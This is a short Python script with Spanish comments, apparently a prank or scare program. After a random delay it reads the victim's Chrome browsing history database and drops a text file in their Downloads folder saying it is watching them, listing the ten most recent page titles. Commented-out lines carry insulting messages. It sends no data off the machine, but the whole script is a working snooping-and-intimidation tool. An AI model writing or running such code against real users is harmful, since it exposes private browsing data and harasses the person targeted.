import os
from pathlib import Path
from time import sleep
from random import randrange
import sqlite3


#CONSTANT

HACKER_FILE = "XXDX--000.txt"


def delay_action():
    # HACER QUE SE CREE EL ARCHIVO CUANDO PASE UNAS HORAS
    x_hours = randrange(1, 4)
    print("DURMIENDO {} HORAS".format(x_hours))
    sleep(x_hours)


def get_user_path():

    return "{}/".format(Path.home())

def generate_txt_message(user_path):
    # Crear archivo
    # a = open(desktop_path + "Para Ti.txt", "w")
    # #Escribir en el archivo
    # a.write("SOY TU MAYOR MIEDO PERRO DE MIERDA")
    # a.close()

    # HACERLO DE UNA MANERA MÁS CHULA
    # with open(user_path + "Downloads\\" + HACKER_FILE, "w") as hackerFile:
    #     hackerFile.write("H9LA SOY EL HACKER DE TIIII")

    hacker_file = open(user_path + "Downloads/" + HACKER_FILE, "w")
    hacker_file.writelines("SOY UN DESGRACIADO PERO TE TENGO VIGILADO\n")
    return hacker_file
def get_chrome_history(user_path):

#HACER QUE SE EJECUTE HASTA QUE EL GOOGLE SE CIERRE
    ursl = None

    while not ursl:
        try:
            # RUTA A LA BD EN HISTOY DE GOOGLE
            db_history = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"

            # CREAR UNA CONECTION CON LA RUTA Y ESTAR DENTRO PARA PODER REALIZAR CUALQUIER COSA CON ELLA
            connection = sqlite3.connect(db_history)

            # APUNTAR A LA BD
            cursor = connection.cursor()

            # REALIZAR SENTENCIA SQL para ver los datos que nos gustaría
            cursor.execute("SELECT title, last_visit_time from urls ORDER BY  last_visit_time DESC")

            # Recoge todos los datos
            urls = cursor.fetchall()

            # MOSTRARMOS POR CONSOLA LA RESPUESTA A LA BD
            # print(urls)

            # Cerrar conexion
            connection.close()

            return urls

        except sqlite3.OperationalError:
            print("NO se pudo continuar porque la base de datos esta abierta, Lo intententamos de nuevo ...")
            sleep(2)


def check_history_write(hacker_file, chrome_history):

    for item in chrome_history[:10]:
        hacker_file.write("He visto que has visitado la web : {} , interesante \n".format(item[0]))

def main():

    #1 Esperamos que pase el tiempo establecido
    delay_action()

    #CALCULAR LA RUTA DEL USUARIO
    user_path = get_user_path()
    # user_path = "C:\\Users\\alexc\\"  #TAREA SABER SI LA RUTA ES LA DE USUARIO
    # desktop_path = user_path + "Downloads\\"

    #CREAMOS EL ARCHIVO
    hacker_file = generate_txt_message(user_path)

    #RECOGEMOS EL HISTORIAL DEL USUARIO DE GOOGLE
    chrome_history = get_chrome_history(user_path)

    #Escribiendo message de terror
    check_history_write(hacker_file, chrome_history)

    #Obtener nombre del user
    # print(os.getlogin())

if __name__ == '__main__':
    main()


#ANOTACIONES
        #NO SE PUEDE EJECUTAR SI EL GOOGLE CHROME ESTA ABIERTO NECESITA ESTAR CERRADO


